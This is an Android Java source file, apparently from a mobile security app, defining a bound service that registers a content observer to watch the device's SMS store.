package com.caliente.mobilsecurit;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;

public class SmsReceiveService extends Service {
	private final IBinder mBinder=new SmsReceiveBinder();
	private boolean app_demarre=false;
	private SmsReceiveObserver smsSentObserver = null;
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	
	@Override
	public void onCreate() 
	{
		// TODO Auto-generated method stub
		super.onCreate();
		System.out.println("SmsReceiveService");
		
		if(!app_demarre)
		{
			smsSentObserver = new SmsReceiveObserver(new Handler(), getApplicationContext());
		    getContentResolver().registerContentObserver(STATUS_URI, true, smsSentObserver);
			app_demarre=true;
		}
	}
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return mBinder;
	}
	
	@Override
	public boolean onUnbind(Intent intent) {
		// TODO Auto-generated method stub
		return super.onUnbind(intent);
	}
	
	
	public class SmsReceiveBinder extends Binder
	{
		SmsReceiveService getService(){
			return SmsReceiveService.this;
		}
	}
}